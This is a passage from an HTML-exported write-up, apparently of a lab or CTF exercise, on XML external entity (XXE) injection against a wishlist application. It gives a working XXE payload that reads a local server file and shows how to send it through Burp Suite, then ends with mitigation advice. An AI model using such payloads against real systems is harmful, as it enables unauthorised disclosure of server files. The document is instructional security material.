+      &lt;product_id&gt;&amp;payload;&lt;/product_id&gt;
+   &lt;/item&gt;
+&lt;/wishlist&gt;
+
+</code></pre></li></ul><ul id="1547aacb-2d23-804b-a480-cde0601bcd3b" class="bulleted-list"><li style="list-style-type:disc">Use Burp Suite&#x27;s Repeater tab to send the modified payload and retrieve sensitive data.</li></ul></li></ol><ol type="1" id="1547aacb-2d23-80c0-a5c6-ceae8cafc409" class="numbered-list" start="5"><li><strong>Accessing Admin Pages:</strong><ul id="1547aacb-2d23-8067-b7a1-f2f892a35a91" class="bulleted-list"><li style="list-style-type:disc">Target restricted files like <code>/var/www/html/wishes/wish_1.txt</code>.</li></ul><ul id="1547aacb-2d23-802a-a42a-c64d827e2f59" class="bulleted-list"><li style="list-style-type:disc">Updated XML payload to exploit:<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1547aacb-2d23-8076-9eb6-e72e7a1da47a" class="code"><code class="language-XML" style="white-space:pre-wrap;word-break:break-all">xml
+Copy code
+&lt;!DOCTYPE foo [
+   &lt;!ENTITY payload SYSTEM &quot;/var/www/html/wishes/wish_1.txt&quot;&gt;
+]&gt;
+&lt;wishlist&gt;
+   &lt;item&gt;
+      &lt;product_id&gt;&amp;payload;&lt;/product_id&gt;
+   &lt;/item&gt;
+&lt;/wishlist&gt;
+
+</code></pre></li></ul></li></ol><hr id="1547aacb-2d23-80d7-8ada-f6b704bbb527"/><h3 id="1547aacb-2d23-80f3-8824-f66fd787b305" class=""><strong>Key Takeaways</strong></h3><ul id="1547aacb-2d23-803d-a621-ea06197fde98" class="bulleted-list"><li style="list-style-type:disc"><strong>Impact of XXE Vulnerabilities:</strong> Exposure of sensitive information and unauthorized system access.</li></ul><ul id="1547aacb-2d23-808f-890d-f99e371f9cd2" class="bulleted-list"><li style="list-style-type:disc"><strong>Importance of Secure XML Parsing:</strong><ul id="1547aacb-2d23-807d-9af7-d867e8eb60ca" class="bulleted-list"><li style="list-style-type:circle">Disable external entities (<code>libxml_disable_entity_loader</code>).</li></ul><ul id="1547aacb-2d23-80b4-8c3f-fc63a497cc00" class="bulleted-list"><li style="list-style-type:circle">Validate and sanitize input before processing.</li></ul></li></ul><ul id="1547aacb-2d23-80fb-8f31-c62858d600f5" class="bulleted-list"><li style="list-style-type:disc"><strong>Proactive Measures:</strong> Conduct thorough security testing before deployment.</li></ul></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
